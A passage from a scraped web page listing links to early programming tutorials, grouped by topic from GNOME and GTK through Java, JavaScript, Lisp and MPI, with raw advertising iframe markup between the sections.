7SPdWc0x-qS%2CABHeCvijin2T3q2Iv7m9vTHxcCWaqv4hJvzHb93sKV3MsJLvxPk5DtIFsjWNu-QeyoWWHEi7mEArfKbNEl8aBBFSiECtDg%2CABHeCvh99NZ0ECz5334yCyBvwjXmot9oLZA3DdIbC1KnhSnO73DRBFazfV5KVRyZImKB4WCf4FvmfNWMRGaB5KrmkZL6GA&amp;pvsid=1928529129288586&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=5&amp;uci=a!5&amp;btvi=4&amp;fsb=1&amp;xpc=x3q5p1d6cO&amp;p=https%3A//coolshell.cn&amp;dtd=8389" data-google-container-id="a!5" data-google-query-id="CILe-c_99v4CFQnTlgodQEMENw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

**GNOME**
[Application Programming Using the GNOME Libraries](http://developer.gnome.org/doc/tutorials/gnome-libs/)
[Part 1: Everything You Need to Get Started](http://www-4.ibm.com/software/developer/library/gnome-programming/indexhtml)
[Part 2: Building a Sample Genealogy Program](http://www-4.ibm.com/software/developer/library/gnome2/)
[Part 3: Adding File Saving and Loading Using libxml](http://www-4.ibm.com/software/developer/library/gnome3/?dwzone=linux)
[Creating GTK+ Widgets with GOB: An Easier Way to Derive New GTK+ Widgets](http://www-4.ibm.com/software/developer/library/gnome4/index.html?dwzone=linux)
[Handling Multipel Documents: Using the GnomeMDI Framework](http://www-4.ibm.com/software/developer/library/gnome5/index.html?dwzone=linux)
[Livening Things Up: Graphics Made Easy Using the GNOME Canvas](http://www-4.ibm.com/software/developer/library/gnomenclature/index.html?dwzone=linux)
[Developing Gnome Applications with Python – Part 1](http://www.linuxfocus.org/English/July2000/article160.shtml)

**GTK**
[GDK Reference Manual](http://developer.gnome.org/doc/API/gdk/index.html)
[GLib Reference Manual](http://developer.gnome.org/doc/API/glib/index.html)
[GTK+ Reference Manual](http://developer.gnome.org/doc/API/gtk/index.html)
[The GIMP Toolkit](http://www.gtk.org/docs/gtk_toc.html)
[GTK+ FAQ](http://www.gtk.org/faq/)
[GTK V1.2 Tutorial](http://www.gtk.org/tutorial/gtk_tut.html)
[Drawing and Event Handling in GTK](http://www.gtk.org/~otaylor/gtk/tutorial/drawing_tut.html)
[An Introduction to the GIMP Tool Kit](http://www2.linuxjournal.com/lj-issues/issue47/2465.html)

**Gnuplot**
[Constrained Dynamics](http://www-cgi.cs.cmu.edu/afs/cs.cmu.edu/user/baraff/www/pbm/constraints.pdf)
[Continuum Dynamics](http://www-cgi.cs.cmu.edu/afs/cs.cmu.edu/user/baraff/www/pbm/continuators.pdf)
[Differential Equation Basics](http://www-cgi.cs.cmu.edu/afs/cs.cmu.edu/user/baraff/www/pbm/diffyq.pdf)
[Energy Functions and Stiffness](http://www-cgi.cs.cmu.edu/afs/cs.cmu.edu/user/baraff/www/pbm/energons.pdf)
[Particle System Dynamics](http://www-cgi.cs.cmu.edu/afs/cs.cmu.edu/user/baraff/www/pbm/particles.pdf)
[An Introduction to Physically Based Modeling](http://www-cgi.cs.cmu.edu/afs/cs.cmu.edu/user/baraff/www/pbm/pbm.html)
[Rigid Body Dynamics I](http://www-cgi.cs.cmu.edu/afs/cs.cmu.edu/user/baraff/www/pbm/rigid1.pdf)
[Rigid Body Dynamics II](http://www-cgi.cs.cmu.edu/afs/cs.cmu.edu/user/baraff/www/pbm/rigid2.pdf)
[Scientific Visualization Tutorials](http://www.cc.gatech.edu/scivis/tutorial/tutorial.html)
[Gnuplot – An Interactive Plotting Program](http://www.eng.hawaii.edu/Tutor/Gnuplot/)
[GIF Animation Tutorial](http://www.webreference.com/dev/gifanim/tutorial.html)

<iframe id="aswift_6" name="aswift_6" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=316722513&amp;adf=3679803352&amp;pi=t.aa~a.425447425~i.27~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135376&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F240.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bi7Tw-MwjaDD2ulFnHObBfzYKUP-uyaetgVtnFwGJC_lPO2bO88Dy3Idam--qxdjj2R0Mfp&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141930270&amp;bpp=1&amp;bdt=3307&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C728x90%2C704x280%2C704x280%2C704x280&amp;nras=8&amp;correlator=3624695096323&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=670395484&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=6908&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=3887&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31073764%2C44782468%2C44788442%2C44789923&amp;oid=2&amp;psts=ABHeCviHYgOwj1kQnfNpHfcc8wlmJan6r5SZlpSyLuzzqQ3gPpNZj_H_c40gvUbt1VXRnYoLk73iK-8Ds7SPdWc0x-qS%2CABHeCvijin2T3q2Iv7m9vTHxcCWaqv4hJvzHb93sKV3MsJLvxPk5DtIFsjWNu-QeyoWWHEi7mEArfKbNEl8aBBFSiECtDg%2CABHeCvh99NZ0ECz5334yCyBvwjXmot9oLZA3DdIbC1KnhSnO73DRBFazfV5KVRyZImKB4WCf4FvmfNWMRGaB5KrmkZL6GA%2CABHeCvjp89V9ThQ7dmk7dkBryiF9xzIKo9qncqo510VkU6NDf9Cn2EtWTLksNxBXq-ZCGpz75rBRPEh6fetOvjFLbtlkpw&amp;pvsid=1928529129288586&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=7&amp;uci=a!7&amp;btvi=5&amp;fsb=1&amp;xpc=hL5CACGFf9&amp;p=https%3A//coolshell.cn&amp;dtd=9226" data-google-container-id="a!7" data-google-query-id="CJWxrdD99v4CFSBXlgodNr4FKA" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

**HTML**
[HTML Table Tutorial](http://www.charm.net/~lejeune/tables.html)
[HTML by Example](http://www.informit.com/product/0789708124/)
[How to Use HTML 3.2](http://www.informit.com/product/1562764969/)
[Creating a Client-Side Image Map](http://www.kasparius.com/nonflash/tutorial/tut1.htm)
[Advanced HTML: How to Create Complex Multimedia Documents for the Web](http://www.ncsa.uiuc.edu/General/Training/AdvHTML/course.html)
[The ABCs of HTML](http://www.ncsa.uiuc.edu/General/Training/HTMLIntro/Intro.html)
[Sharky’s Netscape Frames Tutorial](http://www.sharkysoft.com/tutorials/frames/contents.htm)

**ILU**
[ILU Reference Manual](ftp://ftp.parc.xerox.com/pub/ilu/2.0b1/manual-html/manual_toc.html)
[Using ILU with ANSI C: A Tutorial](ftp://ftp.parc.xerox.com/pub/ilu/misc/tutc.html)
[Using ILU with Java: A Tutorial](ftp://ftp.parc.xerox.com/pub/ilu/misc/tutjava.html)
[Using ILU with Python: A Tutorial](ftp://ftp.parc.xerox.com/pub/ilu/misc/tutpython.html)

**IP-Masquerading**
[ipchains: Packet Filtering for Linux 2.2](http://www.linux-mag.com/1999-05/bestdefense_01.html)
[Setting Up IP Masquerade](http://www.linux-mag.com/1999-08/guru_01.html)
[Setting Up IP-Masquerading](http://www.linuxfocus.org/English/May2000/article151.shtml)
[Ipchains: Easy Links to the Net](http://www.linuxplanet.com/linuxplanet/tutorials/1241/1/)
[Linux Networking Using Ipchains](http://www.linuxplanet.com/linuxplanet/tutorials/2100/1/)

<iframe id="aswift_2" name="aswift_2" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=316722513&amp;adf=25746313&amp;pi=t.aa~a.425447425~i.33~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135376&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F240.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bi7Tw-MwjaDD2ulFnHObBfzYKUP-uyaetgVtnFwGJC_lPO2bO88Dy3Idam--qxdjj2R0Mfp&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141930241&amp;bpp=1&amp;bdt=3278&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C728x90%2C704x280%2C704x280%2C704x280%2C704x280&amp;nras=9&amp;correlator=3624695096323&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=670395484&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=7874&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=4915&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31073764%2C44782468%2C44788442%2C44789923&amp;oid=2&amp;psts=ABHeCviHYgOwj1kQnfNpHfcc8wlmJan6r5SZlpSyLuzzqQ3gPpNZj_H_c40gvUbt1VXRnYoLk73iK-8Ds7SPdWc0x-qS%2CABHeCvijin2T3q2Iv7m9vTHxcCWaqv4hJvzHb93sKV3MsJLvxPk5DtIFsjWNu-QeyoWWHEi7mEArfKbNEl8aBBFSiECtDg%2CABHeCvh99NZ0ECz5334yCyBvwjXmot9oLZA3DdIbC1KnhSnO73DRBFazfV5KVRyZImKB4WCf4FvmfNWMRGaB5KrmkZL6GA%2CABHeCvjp89V9ThQ7dmk7dkBryiF9xzIKo9qncqo510VkU6NDf9Cn2EtWTLksNxBXq-ZCGpz75rBRPEh6fetOvjFLbtlkpw%2CABHeCvhnm2gT_zIBGgkc1eyWOEF7kz_2-LXZiuFUpF_gnBs2fYWzuyhg33i8uZIEO_G7T8TUth5omWbIHwFkTbxzS_0x_Q&amp;pvsid=1928529129288586&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=3&amp;uci=a!3&amp;btvi=6&amp;fsb=1&amp;xpc=xDZJy6c52i&amp;p=https%3A//coolshell.cn&amp;dtd=10155" data-google-container-id="a!3" data-google-query-id="CJTe5ND99v4CFQS9lgodNI0JPQ" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

**IPC**
[Advanced 4.4BSD Interpprocess Communication Tutorial](http://winter.cs.umn.edu/~bentlem/aunix/advipc/ipc.html)
[UNIX Multi-Process Programming and IPC](http://www.actcom.co.il/~choo/lupg/tutorials/multi-process/multi-process.html)

**Java**
[Enterprise JavaBeans Tutorial](http://developer.java.sun.com/developer/onlineTraining/Beans/EJBTutorial/index.html)
[JavaBeans Short Course](http://developer.java.sun.com/developer/onlineTraining/Beans/JBShortCourse/index.html)
[Introduction to the JavaBeans API](http://developer.java.sun.com/developer/onlineTraining/Beans/JBeansAPI/index.html)
[JDBC Short Course](http://developer.java.sun.com/developer/onlineTraining/Database/JDBCShortCourse/index.html)
[Essentials of the Java Programming Language, Part 1](http://developer.java.sun.com/developer/onlineTraining/Programming/BasicJava1/index.html)
[Essentials of the Java Programming Language, Part 2](http://developer.java.sun.com/developer/onlineTraining/Programming/BasicJava2/index.html)
[Writing Advanced Applications for the Java Platform](http://developer.java.sun.com/developer/onlineTraining/Programming/JDCBook/index.html)
[Fundamentals of Java Security](http://developer.java.sun.com/developer/onlineTraining/Security/Fundamentals/abstract.html)
[Fundamentals of Java Servlets](http://developer.java.sun.com/developer/onlineTraining/Servlets/Fundamentals/index.html)
[Introduction to the Collections Framework](http://developer.java.sun.com/developer/onlineTraining/collections/index.html)
[Introduction to CORBA](http://developer.java.sun.com/developer/onlineTraining/corb/a)
[Fundamentals of RMI](http://developer.java.sun.com/developer/onlineTraining/rmi/)
[Advanced](http://home.att.net/~baldwin.r.g/scoop/tocadv.htm)
[Introductory](http://home.att.net/~baldwin.r.g/scoop/tocint.htm)
[Intermediate](http://home.att.net/~baldwin.r.g/scoop/tocmed.htm)
[Java Language Specification](http://java.sun.com/docs/books/jls/index.html)
[Java Tutorial: Servlet Trail](http://java.sun.com/docs/books/tutorial/servlets/index.html)
[Java Virtual Machine Specification (2nd Ed.)](http://java.sun.com/docs/books/vmspec/index.html)
[Glossary of Java and Related Terms](http://java.sun.com/docs/glossary.print.html)
[The Java Language Environment](http://java.sun.com/docs/white/langenv/)
[Java Look and Feel Design Guidelines](http://java.sun.com/products/jlf/dg/index.htm)
[Story of a Servlet: An Instant Tutorial](http://java.sun.com/products/servlet/articles/tutorial/)
[Introduction to Java](http://javaboutique.internet.com/articles/ITJ/)
[Java2D: An Introduction and Tutorial](http://javaboutique.internet.com/tutorials/Java2D/)
[Java Servlet Tutorial](http://jserv.java.sun.com/products/java-server/documentation/webserver11/servlets/servlet_tutorial.html)
[comp.lang.java FAQ](http://metalab.unc.edu/javafaq/javafaq.html)
[Brewing Java: A Tutorial](http://metalab.unc.edu/javafaq/javatutorial.html)
[Shlurrrppp … Java: The First User-Friendly Tutorial on Java](http://users.neca.com/vmis/java.html)
[Swing Tutorial](http://web2.java.sun.com/docs/books/tutorial/uiswing/index.html)
[Swing: A Quick Tutorial for AWT Programmers](http://www.apl.jhu.edu/~hall/jav/aSwing-Tutorial/)
[Thinking in Java](http://www.bruceeckel.com/TIJ2/index.html)
[Java RMI Tutorial](http://www.ccs.neu.edu/home/kenb/com3337/rmi_tut.html)
[Java for C++ Programmers](http://www.cs.wisc.edu/~solomon/cs537/java-tutorial.html)
[The Advanced Jav/aJ2EE Tutorial](http://www.execpc.com/~gopalan/jav/ajava_tutorial.html)
[Hacking Java: The Java Professional’s Resource Kit](http://www.informit.com/product/078970935X/)
[JFC Unleashed](http://www.informit.com/product/0789714663/)
[Java Developer’s Guide](http://www.informit.com/product/157521069X/)
[Java Developer’s Reference](http://www.informit.com/product/1575211297/)
[Sams Teach Yourself Java in 21 Days (Professional Reference Ed.)](http://www.informit.com/product/1575211831/)
[Java Unleashed (2nd Ed.)](http://www.informit.com/product/1575211971/)
[Java 1.1 Unleashed (3rd Ed.)](http://www.informit.com/product/1575212986/)
[Java Game Programming Tutorial](http://www.intergate.bc.c/apersonal/iago/javatut/)
[Java Networking FAQ](http://www.io.com/~maus/JavaNetworkingFAQ.html)
[Java Tutorial: A Practical Guide for Programmers](http://www.javasoft.com/docs/books/tutorial/)
[Sockets Programming in Java](http://www.javaworld.com/javaworld/jw-12-1996/jw-12-sockets.html)
[Programming with Java – Part I](http://www.linuxfocus.org/English/articles/article34.html)
[Programming with Java – Part II](http://www.linuxfocus.org/English/articles/article8.html)
[Setting Up a Java Development Environment for Linux](http://www.linuxgazette.com/issue45/gibbs/Linux_java.html)
[Understanding Java](http://www.sofcom.com.au/jav/a)
[Beginner’s Guide to JDK](http://www2.linuxjournal.com/lj-issues/issue55/2570.html)
[GUI Development in Java](http://www2.linuxjournal.com/lj-issues/issue61/2673.html)
[Java Servlets: An introduction to writing and running Java servlets on Linux](http://www2.linuxjournal.com/lj-issues/issue66/3119.html)

<iframe id="aswift_5" name="aswift_5" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=316722513&amp;adf=4013554258&amp;pi=t.aa~a.425447425~i.37~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135376&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F240.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bi7Tw-MwjaDD2ulFnHObBfzYKUP-uyaetgVtnFwGJC_lPO2bO88Dy3Idam--qxdjj2R0Mfp&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141930264&amp;bpp=1&amp;bdt=3302&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C728x90%2C704x280%2C704x280%2C704x280%2C704x280%2C704x280&amp;nras=10&amp;correlator=3624695096323&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=670395484&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=9992&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=6973&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31073764%2C44782468%2C44788442%2C44789923&amp;oid=2&amp;psts=ABHeCviHYgOwj1kQnfNpHfcc8wlmJan6r5SZlpSyLuzzqQ3gPpNZj_H_c40gvUbt1VXRnYoLk73iK-8Ds7SPdWc0x-qS%2CABHeCvijin2T3q2Iv7m9vTHxcCWaqv4hJvzHb93sKV3MsJLvxPk5DtIFsjWNu-QeyoWWHEi7mEArfKbNEl8aBBFSiECtDg%2CABHeCvh99NZ0ECz5334yCyBvwjXmot9oLZA3DdIbC1KnhSnO73DRBFazfV5KVRyZImKB4WCf4FvmfNWMRGaB5KrmkZL6GA%2CABHeCvjp89V9ThQ7dmk7dkBryiF9xzIKo9qncqo510VkU6NDf9Cn2EtWTLksNxBXq-ZCGpz75rBRPEh6fetOvjFLbtlkpw%2CABHeCvhnm2gT_zIBGgkc1eyWOEF7kz_2-LXZiuFUpF_gnBs2fYWzuyhg33i8uZIEO_G7T8TUth5omWbIHwFkTbxzS_0x_Q%2CABHeCvjKXyMeD7cDFTZRjsZQ1hK1vIC9kAZbiRCAwRy2YLSRsiOxq9-AeyZ_lDYmIUl67hvhTogJe1LzDIPk9wJWqgxITw&amp;pvsid=1928529129288586&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=6&amp;uci=a!6&amp;btvi=7&amp;fsb=1&amp;xpc=Wg4GNU5yIm&amp;p=https%3A//coolshell.cn&amp;dtd=11399" data-google-container-id="a!6" data-google-query-id="CMCFstH99v4CFUmilgodGXgMoA" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

**JavaScript**
[Introductory JavaScript Tutorials](http://andyjava.simplenet.com/)
[JavaScript Authoring Guide](http://developer.netscape.com/docs/manuals/communicator/jsguide4/index.htm)
[Client-Side JavaScript 1.3 Guide](http://developer.netscape.com/docs/manuals/js/client/jsguide/index.htm)
[Client-Side JavaScript 1.3 Reference](http://developer.netscape.com/docs/manuals/js/client/jsref/index.htm)
[Core JavaScript 1.4 Guide](http://developer.netscape.com/docs/manuals/js/core/jsguide/index.htm)
[Core JavaScript 1.4 Reference](http://developer.netscape.com/docs/manuals/js/core/jsref/index.htm)
[Server-Side JavaScript 1.4 Guide](http://developer.netscape.com/docs/manuals/ssjs/1_4/contents.htm)
[JavaScript FAQ](http://developer.netscape.com/support/faqs/champions/javascript.html)
[JavaScript Tutorial](http://home.att.net/~baldwin.r.g/scoop/tocjscript1.htm)
[The Way of JavaScript](http://rampages.onramp.net/~jnardo/javascript/zen.html)
[Voodoo’s Introduction to JavaScript](http://rummelplatz.uni-mannheim.de/~skoch/js/tutorial.htm)
[JavaScript Tutorial for Programmers](http://wdvl.com/Authoring/JavaScript/Tutorial/)
[JavaScript Primer](http://wsabstract.com/javatutors/primer1.shtml)
[EchoEcho JavaScript Tutorial](http://www.echoecho.com/javascript.htm)
[Sams Teach Yourself JavaScript 1.1 in a Week (2nd Ed.)](http://www.informit.com/product/1575211955/)

**Lisp**
[Common Lisp Hints](http://ringer.cs.utsa.edu/research/AI/cltl/common-lisp-tutorial.html)
[Common Lisp the Language (2nd Ed.)](http://www.cs.cmu.edu/Web/Groups/AI/html/cltl/cltl2.html)
[Lisp FAQ](http://www.cs.cmu.edu/Web/Groups/AI/html/faqs/lang/lisp/top.html)
[Lisp Programming Tutorial](http://www.cse.cuhk.edu.hk/~csc4510/lisp/html/lisp.html)
[Lisp Tutorial](http://www.eecs.tulane.edu/www/Villamil/lisp/lisp1.html)
[LISP Tutorial](http://www.nyu.edu/pages/linguistics/nlcp/lisp.html)
[Common Lisp HyperSpec](http://www.xanalys.com/software_tools/reference/HyperSpec/FrontMatter/index.html)

**MIDI**
[Basic MIDI Tutorials](http://www.borg.com/~jglatt/tutr/miditutr.htm)
[Tutorial on MIDI and Music Synthesis](http://www.harmony-central.com/MIDI/Doc/tutorial.html)

**ML**
[ML Tutorial](http://cs.wwc.edu/Environment/SML-Tutorial.html)
[Programming in Standard ML ’97](http://www.dcs.ed.ac.uk/home/stg/NOTES/)
[A Gentle Introduction to ML](http://www.dcs.napier.ac.uk/course-notes/sml/manual.html)
[Moscow ML Owner’s Manual](http://www.dina.dk/~sestoft/manual/manual.html)

**MPI**
[An MPI Tutorial](http://www-erl.mit.edu/cagc/mpi/tutorial.html)
[Tutorial on MPI](http://www-unix.mcs.anl.gov/mpi/tutorial/)
[MPI: Portable Parallel Programming for Scientific Computing](http://www-unix.mcs.anl.gov/mpi/tutorial/mpibasics/index.htm)
[Tuning MPI Applications for Peak Performance](http://www-unix.mcs.anl.gov/mpi/tutorial/perf/index.html)
[MPI: From Fundamentals to Applications](http://www.epm.ornl.gov/~walker/mpi/SLIDES/mpi-tutorial.html)
[MPI Tutorial](http://www.mpi.nd.edu/mpi_tutorials/)
[MPI: The Complete Reference](http://www.netlib.org/utk/papers/mpi-book/mpi-book.html)
[Introduction to Parallel Programming Using MPI](http://www.scs.leeds.ac.uk/cpde/tutorial.html)
[Basics of MPI Programming](http://www.tc.cornell.edu/Edu/Talks/MPI/Basic/)

<iframe id="aswift_8" name="aswift_8" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=316722513&amp;adf=2349380599&amp;pi=t.aa~a.425447425~i.47~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135376&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F240.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bi7Tw-MwjaDD2ulFnHObBfzYKUP-uyaetgVtnFwGJC_lPO2bO88Dy3Idam--qxdjj2R0Mfp&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141930282&amp;bpp=1&amp;bdt=3319&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C728x90%2C704x280%2C704x280%2C704x280%2C704x280%2C704x280%2C704x280&amp;nras=11&amp;correlator=3624695096323&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=670395484&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=11730&amp;bi